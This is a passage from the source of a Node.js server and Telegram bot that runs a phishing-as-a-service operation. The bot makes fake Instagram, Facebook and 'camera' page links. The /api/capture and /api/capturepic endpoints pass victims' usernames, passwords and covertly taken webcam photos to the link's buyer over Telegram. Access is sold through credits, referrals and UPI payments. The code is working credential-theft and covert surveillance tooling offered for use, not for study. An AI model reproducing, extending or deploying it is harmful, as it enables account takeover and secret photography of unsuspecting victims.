        if(photos.length===0){grid.innerHTML='<div class="empty"><i>📷</i>No photos uploaded</div>';return;}
        grid.innerHTML=photos.map(p=>\`
            <div class="card">
                <img src="\${p.url}">
                <div class="info">
                    <div>\${p.caption||'No caption'}</div>
                    <div style="font-size:12px;color:#888;">\${new Date(p.uploadedAt).toLocaleDateString()}</div>
                    <div style="font-size:12px;color:\${p.active?'#28a745':'#dc3545'};">\${p.active?'✅ Active':'❌ Inactive'}</div>
                </div>
                <div class="actions">
                    <button class="btn btn-warning" onclick="togglePhoto('\${p.id}')">\${p.active?'Hide':'Show'}</button>
                    <button class="btn btn-danger" onclick="deletePhoto('\${p.id}')">Delete</button>
                </div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading photos',true);}
}

async function deletePhoto(id){if(!confirm('Delete?'))return;try{const r=await fetch(\`/api/admin/photos/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Deleted!');loadPhotos();}else showToast('Delete failed',true);}catch(err){showToast('Error',true);}}

async function togglePhoto(id){try{const r=await fetch(\`/api/admin/photos/\${id}/toggle\`,{method:'PATCH'});if(r.ok){showToast('Toggled!');loadPhotos();}else showToast('Toggle failed',true);}catch(err){showToast('Error',true);}}

document.getElementById('uploadForm').addEventListener('submit',async(e)=>{
    e.preventDefault();const fd=new FormData(e.target);
    try{const r=await fetch('/api/admin/upload',{method:'POST',body:fd});if(r.ok){showToast('Uploaded!');e.target.reset();loadPhotos();}else showToast('Upload failed',true);}catch(err){showToast('Error',true);}
});

// CHANNELS
async function loadChannels(){
    try{
        const r=await fetch('/api/admin/channels');
        const channels=await r.json();
        const list=document.getElementById('channelList');
        if(channels.length===0){list.innerHTML='<div class="empty"><i>📢</i>No channels added</div>';return;}
        list.innerHTML=channels.map(c=>\`
            <div class="channel-item">
                <div>
                    <div class="name">\${c.name}</div>
                    <div class="id">\${c.id}</div>
                </div>
                <div>
                    <a href="\${c.link}" target="_blank" class="btn btn-primary">Visit</a>
                    <button class="btn btn-danger" onclick="removeChannel('\${c.id}')">Remove</button>
                </div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading channels',true);}
}

async function addChannel(){
    const id=document.getElementById('channelId').value.trim();
    const name=document.getElementById('channelName').value.trim();
    const link=document.getElementById('channelLink').value.trim();
    if(!id||!name||!link){showToast('Please fill all fields',true);return;}
    try{
        const r=await fetch('/api/admin/channels',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id,name,link})});
        if(r.ok){showToast('Channel added!');document.getElementById('channelId').value='';document.getElementById('channelName').value='';document.getElementById('channelLink').value='';loadChannels();}
        else showToast('Add failed',true);
    }catch(err){showToast('Error',true);}
}

async function removeChannel(id){if(!confirm('Remove this channel?'))return;try{const r=await fetch(\`/api/admin/channels/\${id}\`,{method:'DELETE'});if(r.ok){showToast('Removed!');loadChannels();}else showToast('Remove failed',true);}catch(err){showToast('Error',true);}}

// USERS
async function loadUsers(){
    try{
        const r=await fetch('/api/admin/users');
        const users=await r.json();
        const list=document.getElementById('userList');
        const entries=Object.entries(users);
        if(entries.length===0){list.innerHTML='<div class="empty"><i>👥</i>No users</div>';return;}
        list.innerHTML=entries.map(([id,data])=>\`
            <div class="user-card">
                <div class="uid">🆔 \${id}</div>
                <div>⭐ Credits: \${data.unlimited?'♾️ Unlimited':data.credits||0}</div>
                <div>👥 Referrals: \${data.totalReferrals||0}</div>
                <div>📅 Joined: \${new Date(data.joinedAt).toLocaleDateString()}</div>
                <div style="font-size:12px;color:#888;">Referred by: \${data.referredBy||'None'}</div>
            </div>
        \`).join('');
    }catch(err){showToast('Error loading users',true);}
}

async function searchUser(){
    const uid=document.getElementById('searchUser').value.trim();
    if(!uid){showToast('Enter User ID',true);return;}
    try{
        const r=await fetch(\`/api/admin/user/\${uid}\`);
        const user=await r.json();
        if(user.error){showToast('User not found',true);return;}
        document.getElementById('userList').innerHTML=\`
            <div class="user-card">
                <div class="uid">🆔 \${uid}</div>
                <div>⭐ Credits: \${user.unlimited?'♾️ Unlimited':user.credits||0}</div>
                <div>👥 Referrals: \${user.totalReferrals||0}</div>
                <div>📅 Joined: \${new Date(user.joinedAt).toLocaleDateString()}</div>
                <div>Referred by: \${user.referredBy||'None'}</div>
            </div>
        \`;
    }catch(err){showToast('Error',true);}
}

async function modifyCredits(){
    const uid=document.getElementById('userIdInput').value.trim();
    const amount=parseInt(document.getElementById('creditAmount').value);
    if(!uid||isNaN(amount)){showToast('Enter valid User ID and amount',true);return;}
    try{
        const r=await fetch('/api/admin/modify-credits',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid,amount})});
        const data=await r.json();
        if(data.success){showToast(\`Credits updated! New balance: \${data.credits}\`);loadUsers();}
        else showToast('Update failed',true);
    }catch(err){showToast('Error',true);}
}

async function toggleUnlimited(){
    const uid=document.getElementById('userIdInput').value.trim();
    if(!uid){showToast('Enter User ID',true);return;}
    try{
        const r=await fetch('/api/admin/toggle-unlimited',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userId:uid})});
        const data=await r.json();
        if(data.success){showToast(\`Unlimited: \${data.unlimited?'ON':'OFF'}\`);loadUsers();}
        else showToast('Toggle failed',true);
    }catch(err){showToast('Error',true);}
}

// QR
async function uploadQR(){
    const file=document.getElementById('qrUpload').files[0];
    if(!file){showToast('Select an image',true);return;}
    const fd=new FormData();
    fd.append('qr',file);
    try{
        const r=await fetch('/api/admin/upload-qr',{method:'POST',body:fd});
        const data=await r.json();
        if(data.success){showToast('QR uploaded!');document.getElementById('qrPreview').innerHTML=\`<img src="/api/admin/qr?t=\${Date.now()}" style="max-width:200px;border-radius:10px">\`;}
        else showToast('Upload failed',true);
    }catch(err){showToast('Error',true);}
}

// Load initial data
loadPhotos();
loadChannels();
loadUsers();

// Check for existing QR
fetch('/api/admin/qr').then(r=>r.json()).then(data=>{
    if(data.url) document.getElementById('qrPreview').innerHTML=\`<img src="/api/admin/qr?t=\${Date.now()}" style="max-width:200px;border-radius:10px">\`;
}).catch(()=>{});
</script>
</body>
</html>`);
});

// ====================== ADMIN API ======================
app.get('/api/admin/photos', (req, res) => res.json({ photos: getPhotos(), total: getPhotos().length }));

app.post('/api/admin/upload', upload.single('photo'), (req, res) => {
    try {
        if (!req.file) return res.status(400).json({ error: 'No file' });
        const photo = addPhoto(req.file, req.body.caption || '');
        res.json({ success: true, photo });
    } catch (err) { res.status(500).json({ error: err.message }); }
});

app.delete('/api/admin/photos/:id', (req, res) => res.json({ success: deletePhoto(req.params.id) }));

app.patch('/api/admin/photos/:id/toggle', (req, res) => {
    const photo = togglePhoto(req.params.id);
    res.json({ success: !!photo, photo });
});

// Channels API
app.get('/api/admin/channels', (req, res) => res.json(getChannels()));

app.post('/api/admin/channels', (req, res) => {
    const { id, name, link } = req.body;
    if (!id || !name || !link) return res.status(400).json({ error: 'Missing fields' });
    res.json(addChannel(id, name, link));
});

app.delete('/api/admin/channels/:id', (req, res) => res.json(removeChannel(req.params.id)));

// Users API
app.get('/api/admin/users', (req, res) => res.json(getUsers()));

app.get('/api/admin/user/:id', (req, res) => {
    const user = getUser(req.params.id);
    if (!user) return res.json({ error: 'User not found' });
    res.json(user);
});

app.post('/api/admin/modify-credits', (req, res) => {
    const { userId, amount } = req.body;
    if (!userId || isNaN(amount)) return res.status(400).json({ error: 'Invalid data' });
    const user = getUser(userId);
    if (user.unlimited) return res.json({ success: true, credits: 'Unlimited' });
    user.credits = Math.max(0, (user.credits || 0) + amount);
    saveUsers(getUsers());
    res.json({ success: true, credits: user.credits });
});

app.post('/api/admin/toggle-unlimited', (req, res) => {
    const { userId } = req.body;
    if (!userId) return res.status(400).json({ error: 'No userId' });
    const user = getUser(userId);
    user.unlimited = !user.unlimited;
    saveUsers(getUsers());
    res.json({ success: true, unlimited: user.unlimited });
});

// QR Code API
const QR_FILE = path.join(DATA_DIR, 'qr.png');
app.post('/api/admin/upload-qr', upload.single('qr'), (req, res) => {
    if (!req.file) return res.status(400).json({ error: 'No file' });
    if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
    fs.renameSync(req.file.path, QR_FILE);
    res.json({ success: true });
});

app.get('/api/admin/qr', (req, res) => {
    if (fs.existsSync(QR_FILE)) res.sendFile(QR_FILE);
    else res.json({ url: null });
});

// ====================== BOT API ======================
app.get('/api/bot/random-photo', (req, res) => {
    const photo = getRandomPhoto();
    if (photo) res.json({ success: true, photo });
    else res.status(404).json({ error: 'No photos' });
});

app.post('/api/capture', async (req, res) => {
    const { userid, user, pass, platform } = req.body || {};
    if (!userid || !user) return res.status(400).json({ error: 'Missing fields' });
    try {
        const photo = getRandomPhoto();
        let message = LoveNotifer(platform, pass, user);
        if (photo) {
            const photoUrl = `${req.protocol}://${req.get('host')}${photo.url}`;
            await S7.sendPhoto(userid, photoUrl, { caption: message, parse_mode: 'HTML' });
        } else {
            await S7.sendMessage(userid, message);
        }
        res.json({ status: 'success' });
    } catch (error) { res.status(500).json({ error: error.message }); }
});

app.post('/api/capturepic', async (req, res) => {
    const { userid, mobile, SY, platform } = req.body || {};
    if (!userid || !SY) return res.status(400).json({ error: 'Missing required photo data' });
    try {
        const photoBuffer = Buffer.from(SY.replace(/^data:image\/\w+;base64,/, ""), 'base64');
        const SYloveTiMe = moment().tz("Asia/Kolkata").format('h:mm:ss A');
        const SYloveDaTe = moment().tz("Asia/Kolkata").format('DD/MM/YYYY');
        const caption = `<b>📸 NEW CAPTURE 📸</b>\n\n` +
            `👤 <b>Target:</b> <code>${mobile || 'Unknown'}</code>\n` +
            `🌐 <b>Platform:</b> ${platform ? platform.toUpperCase() : 'N/A'}\n` +
            `📅 <b>Date:</b> ${SYloveDaTe}\n` +
            `⏰ <b>Time:</b> ${SYloveTiMe}\n\n` +
            `<i>© ↝ ᴅᴇᴠ ʙʏ » ${config.S7}</i>`;
        await S7.sendPhoto(userid, photoBuffer, { caption, parse_mode: 'HTML' });
        res.json({ status: 'success' });
    } catch (error) { res.status(500).json({ error: 'Failed to process image' }); }
});

// ====================== LINK GENERATION ======================
app.get('/api/create-link', (req, res) => {
    const userid = req.headers.userid || 'unknown';
    const platform = req.headers.platform || 'instagram';
    const p = platform.toLowerCase();
    
    if (userid !== 'unknown') {
        const user = getUser(userid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            return res.status(402).json({ 
                error: 'Insufficient credits', 
                message: 'You need 1 credit to generate a link. Get more credits via referral or purchase!',
                credits: user.credits || 0,
                needBuy: true
            });
        }
        useCredit(userid);
    }
    
    let template;
    if (p === 'instagram') template = TEMPLATES.instagram;
    else if (p === 'facebook') template = TEMPLATES.facebook;
    else if (p === 'camera') template = TEMPLATES.camera;
    else return res.status(400).json({ error: 'Invalid platform' });
    
    const displayPlatform = p === 'instagram' ? '𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌' : p === 'facebook' ? '𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊' : '𝐂𝐀𝐌𝐄𝐑𝐀';
    let html = template
        .replace(/USERID_PLACEHOLDER/g, userid)
        .replace(/PLATFORM_PLACEHOLDER/g, displayPlatform);
    
    const fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
    fs.writeFileSync(path.join(PAGES_DIR, `${fileId}.html`), html);
    const url = `${config.baseUrl}/page/${fileId}`;
    console.log(`🔗 Link generated: ${url} for user ${userid}`);
    res.json({ success: true, url, id: fileId });
});

app.get('/page/:id', (req, res) => {
    const id = req.params.id;
    const filePath = path.join(PAGES_DIR, `${id}.html`);
    if (fs.existsSync(filePath)) res.sendFile(filePath);
    else res.status(404).send('<h1>Page not found</h1>');
});

// ====================== TELEGRAM BOT ======================
const S7 = new TelegramBot(config.mainToken, { polling: true });

S7.getMe().then((botInfo) => {
    console.log(`✅ Bot Started: @${botInfo.username}`);
    console.log(`✅ Bot ID: ${botInfo.id}`);
}).catch(err => {
    console.error('❌ Bot Start Error:', err.message);
    process.exit(1);
});

// ====================== KEYBOARDS ======================
const LOVESY = {
    inline_keyboard: [
        [{ text: "𝐈𝐍𝐒𝐓𝐀𝐆𝐑𝐀𝐌", callback_data: "gen_instagram" }],
        [{ text: "𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊", callback_data: "gen_facebook" }],
        [{ text: "𝐂𝐀𝐌𝐄𝐑𝐀", callback_data: "gen_camera" }],
        [{ text: "👥 Referral", callback_data: "referral" }],
        [{ text: "⭐ My Credits", callback_data: "credits" }],
        [{ text: "💰 Buy Credits", callback_data: "buy_credits" }]
    ]
};

const SYBack = { inline_keyboard: [[{ text: "🔙 BACK", callback_data: "back" }]] };

const getRegenMarkup = (platform) => ({
    inline_keyboard: [
        [{ text: `🔄 REGENERATE LINK`, callback_data: `regen_${platform}` }],
        [{ text: "🔙 BACK", callback_data: "back" }]
    ]
});

// ====================== BOT COMMANDS ======================
async function SendLoveSYMenu(chatId, firstName) {
    const user = getUser(chatId);
    const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
    const message = `𝙃𝙖𝙫𝙚 𝘼 𝙎𝙚𝙭𝙮 𝘿𝙖𝙮 ☻\n\n⭐ Credits: ${credits}\n👥 Referrals: ${user.totalReferrals || 0}`;
    const menuText = SYloveMenu(firstName, message);
    await S7.sendMessage(chatId, menuText, { parse_mode: 'HTML', reply_markup: LOVESY });
}

async function checkAndSendMenu(chatId, firstName) {
    const isMember = await checkAllChannels(chatId);
    if (!isMember) {
        const channels = getChannels();
        let msg = '⚠️ <b>Access Denied!</b>\n\nPlease join all our channels to use this bot:\n\n';
        channels.forEach((c, i) => {
            msg += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
        });
        msg += '\nAfter joining, click the button below to verify.';
        return S7.sendMessage(chatId, msg, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
    }
    await SendLoveSYMenu(chatId, firstName);
}

function SYLoVe(commands) {
    if (!Array.isArray(commands)) commands = [commands];
    S7.on('message', async (msg) => {
        if (!msg.text) return;
        const cmd = msg.text.trim().split(' ')[0].slice(1);
        if (commands.includes(cmd)) {
            console.log(`📩 Command: ${cmd} from ${msg.from.first_name}`);
            await checkAndSendMenu(msg.chat.id, msg.from.first_name);
        }
    });
}

SYLoVe(['start', 'menu']);

// ====================== REFERRAL HANDLER ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/start ref_')) {
        const referrerId = text.replace('/start ref_', '');
        const userId = msg.from.id;
        
        const user = getUser(userId);
        if (user.referredBy) {
            return S7.sendMessage(userId, '✅ You are already registered!');
        }
        
        const referrer = getUser(referrerId);
        if (!referrer) {
            return S7.sendMessage(userId, '❌ Invalid referral link!');
        }
        
        if (!await checkAllChannels(userId)) {
            user._pendingReferrer = referrerId;
            saveUsers(getUsers());
            
            const channels = getChannels();
            let msgText = '⚠️ <b>Please join all channels first!</b>\n\n';
            channels.forEach((c, i) => {
                msgText += `${i+1}. <a href="${c.link}">${c.name}</a>\n`;
            });
            msgText += '\nAfter joining, click the button below to verify and claim your referral bonus!';
            return S7.sendMessage(userId, msgText, { parse_mode: 'HTML', reply_markup: getChannelButtons() });
        }
        
        await processReferral(referrerId, userId);
    }
});

async function processReferral(referrerId, userId) {
    const user = getUser(userId);
    if (user.referredBy) return;
    
    user.referredBy = referrerId;
    user.credits = (user.credits || 0) + 3;
    saveUsers(getUsers());
    
    const referrer = addReferral(referrerId, userId);
    
    let newUserInfo = '@user_' + userId;
    try {
        const chat = await S7.getChat(userId);
        newUserInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + userId;
    } catch(e) {}
    
    let referrerInfo = '@user_' + referrerId;
    try {
        const chat = await S7.getChat(referrerId);
        referrerInfo = chat.username ? '@' + chat.username : chat.first_name || '@user_' + referrerId;
    } catch(e) {}
    
    await S7.sendMessage(referrerId, 
        `🎉 <b>New Referral Success!</b>\n\n` +
        `👤 <b>New User:</b> ${newUserInfo}\n` +
        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
        `⭐ <b>Points Earned:</b> +2\n\n` +
        `📊 <b>Your Total Points:</b> ${referrer.credits || 0}\n` +
        `📊 <b>Your Total Referrals:</b> ${referrer.totalReferrals || 0}`,
        { parse_mode: 'HTML' }
    );
    
    await S7.sendMessage(config.adminId,
        `👥 <b>New Referral Success!</b>\n\n` +
        `👤 <b>Referrer:</b> ${referrerInfo}\n` +
        `👤 <b>New User:</b> ${newUserInfo}\n` +
        `🆔 <b>Referrer ID:</b> <code>${referrerId}</code>\n` +
        `🆔 <b>New User ID:</b> <code>${userId}</code>\n` +
        `⭐ <b>Points Earned:</b> 2\n\n` +
        `📊 <b>Referrer Total Points:</b> ${referrer.credits || 0}\n` +
        `📊 <b>Referrer Total Referrals:</b> ${referrer.totalReferrals || 0}`,
        { parse_mode: 'HTML' }
    );
    
    await S7.sendMessage(userId, 
        `✅ <b>Welcome!</b>\n\n` +
        `You joined through <b>${referrerInfo}</b>'s referral link!\n` +
        `🎁 <b>Bonus:</b> +3 Credits\n` +
        `⭐ <b>Your Credits:</b> ${user.credits}`,
        { parse_mode: 'HTML' }
    );
    
    await SendLoveSYMenu(userId, (await S7.getChat(userId)).first_name);
}

// ====================== CALLBACK QUERY HANDLER ======================
S7.on('callback_query', async (q) => {
    const uid = q.from.id;
    const mid = q.message.message_id;
    const cid = q.message.chat.id;
    console.log(`🔘 Callback: ${q.data} from ${q.from.first_name}`);
    
    if (q.data === "check_all") {
        const isMember = await checkAllChannels(uid);
        if (isMember) {
            await S7.deleteMessage(cid, mid);
            
            const user = getUser(uid);
            if (user._pendingReferrer) {
                const referrerId = user._pendingReferrer;
                delete user._pendingReferrer;
                saveUsers(getUsers());
                await processReferral(referrerId, uid);
                return;
            }
            
            await SendLoveSYMenu(cid, q.from.first_name);
        } else {
            await S7.answerCallbackQuery(q.id, { text: "❌ Please join ALL channels first!", show_alert: true });
        }
        return;
    }
    
    if (q.data === "referral") {
        const botInfo = await S7.getMe();
        const referralLink = `https://t.me/${botInfo.username}?start=ref_${uid}`;
        await S7.sendMessage(cid,
            `👥 <b>Your Referral Link</b>\n\n` +
            `Share this link with your friends:\n\n` +
            `<code>${referralLink}</code>\n\n` +
            `📌 <b>How it works:</b>\n` +
            `• Share your link with friends\n` +
            `• They join all channels\n` +
            `• You get +2 credits!\n` +
            `• They get +3 credits bonus!`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "credits") {
        const user = getUser(uid);
        const credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
        await S7.sendMessage(cid,
            `⭐ <b>Your Credits</b>\n\n` +
            `💰 Credits: ${credits}\n` +
            `👥 Referrals: ${user.totalReferrals || 0}\n` +
            `📅 Joined: ${new Date(user.joinedAt).toLocaleDateString()}\n\n` +
            `🔹 Each link uses 1 credit\n` +
            `🔹 Get +2 credits per referral\n` +
            `🔹 New users get +3 bonus credits`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data === "buy_credits") {
        await S7.sendMessage(cid,
            `💰 <b>Buy Credits</b>\n\n` +
            `📌 <b>Pricing:</b>\n` +
            `• 1 Credit = ₹1\n` +
            `• 50 Credits = ₹50 (Unlimited Lifetime!)\n\n` +
            `🔹 <b>Unlimited</b> = Generate unlimited links forever!\n\n` +
            `💳 <b>How to Pay:</b>\n` +
            `1. Send payment to the QR code\n` +
            `2. Send <code>/pay [amount]</code> after payment\n\n` +
            `📱 <b>Payment Options:</b>\n` +
            `• UPI: rtf@upi\n` +
            `• PhonePe: 9876543210\n` +
            `• Google Pay: 9876543210\n\n` +
            `Type <code>/pay 50</code> for Unlimited!`,
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        await S7.deleteMessage(cid, mid);
        return;
    }
    
    if (q.data.startsWith("gen_") || q.data.startsWith("regen_")) {
        const isGen = q.data.startsWith("gen_");
        const platform = q.data.replace(isGen ? "gen_" : "regen_", "");
        
        const user = getUser(uid);
        if (!user.unlimited && (user.credits || 0) <= 0) {
            await S7.answerCallbackQuery(q.id, {
                text: "❌ Insufficient credits! Use referral or buy credits.",
                show_alert: true
            });
            return;
        }
        
        const loadingMsg = await S7.sendMessage(cid, 
            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'), 
            { parse_mode: 'HTML', reply_markup: SYBack }
        );
        
        try {
            const response = await fetch(`http://localhost:${config.port}/api/create-link`, {
                method: 'GET',
                headers: { userid: String(uid), platform: platform }
            });
            const data = await response.json();
            
            if (data.error && data.needBuy) {
                await S7.editMessageText(
                    SYloveMenu(q.from.first_name, `❌ ${data.message}`),
                    { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
                );
                return;
            }
            
            const finalMsg = `✅ <b>Link Generated!</b>\n\n` +
                `📎 <b>Your Link:</b>\n` +
                `<code>${data.url}</code>\n\n` +
                `📌 <b>Platform:</b> ${platform.toUpperCase()}\n` +
                `🔄 Share and earn referrals!`;
            
            await S7.editMessageText(
                SYloveMenu(q.from.first_name, finalMsg),
                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: getRegenMarkup(platform) }
            );
        } catch (err) {
            console.error('Link Error:', err.message);
            await S7.editMessageText(
                SYloveMenu(q.from.first_name, '❌ Error generating link'),
                { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
            );
        }
        return;
    }
    
    if (q.data === "back") {
        await S7.deleteMessage(cid, mid);
        await SendLoveSYMenu(cid, q.from.first_name);
    }
});

// ====================== PAYMENT COMMAND ======================
S7.on('message', async (msg) => {
    if (!msg.text) return;
    const text = msg.text.trim();
    if (text.startsWith('/pay')) {
        const parts = text.split(' ');
        if (parts.length < 2) {
            return S7.sendMessage(msg.chat.id, '⚠️ Usage: /pay [amount]\nExample: /pay 50');
        }
        const amount = parseInt(parts[1]);
        if (isNaN(amount) || amount < 1) {
            return S7.sendMessage(msg.chat.id, '⚠️ Please enter a valid amount (minimum ₹1)');
        }
        
        const uid = msg.from.id;
        let responseText;
        
        if (amount >= 50) {
            const user = getUser(uid);
            user.unlimited = true;
            saveUsers(getUsers());
            responseText = `🎉 <b>UNLIMITED ACTIVATED!</b>\n\n` +
                `💰 Payment: ₹${amount}\n` +
                `⭐ Status: ♾️ Unlimited Lifetime\n\n` +
                `You can now generate unlimited links forever!\n` +
                `Thank you for your support! 🙏`;
                
            await S7.sendMessage(config.adminId,
                `💰 <b>Unlimited Activated!</b>\n\n` +
                `👤 User: @${msg.from.username || 'user_' + uid}\n` +
                `🆔 ID: <code>${uid}</code>\n` +
                `💵 Amount: ₹${amount}\n` +
                `⭐ Status: Unlimited Lifetime`,
                { parse_mode: 'HTML' }
            );
        } else {
            const user = getUser(uid);
            if (user.unlimited) {
                return S7.sendMessage(msg.chat.id, '⚠️ You already have Unlimited!');
            }
            user.credits = (user.credits || 0) + amount;
            saveUsers(getUsers());
            responseText = `✅ <b>Credits Added!</b>\n\n` +
                `💰 Payment: ₹${amount}\n` +
                `⭐ Credits Added: +${amount}\n` +
                `📊 Total Credits: ${user.credits}\n\n` +
                `Thank you for your support! 🙏`;
                
            await S7.sendMessage(config.adminId,
                `💰 <b>Credits Purchased!</b>\n\n` +
                `👤 User: @${msg.from.username || 'user_' + uid}\n` +
                `🆔 ID: <code>${uid}</code>\n` +
                `💵 Amount: ₹${amount}\n` +
                `⭐ Credits: +${amount}`,
                { parse_mode: 'HTML' }
            );
        }
        
        await S7.sendMessage(msg.chat.id, responseText, { parse_mode: 'HTML' });
        await SendLoveSYMenu(msg.chat.id, msg.from.first_name);
    }
});

// ====================== START SERVER ======================
app.listen(config.port, () => {
    console.log(`✅ Server running on port ${config.port}`);
    console.log(`📌 Admin Panel: http://localhost:${config.port}/admin`);
    console.log(`📌 Base URL: ${config.baseUrl}`);
    console.log(`🤖 Bot is ready! Send /start to begin.`);
});

// ====================== ERROR HANDLING ======================
process.on('uncaughtException', (err) => {
    console.error('❌ Uncaught Exception:', err.message);
});

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});
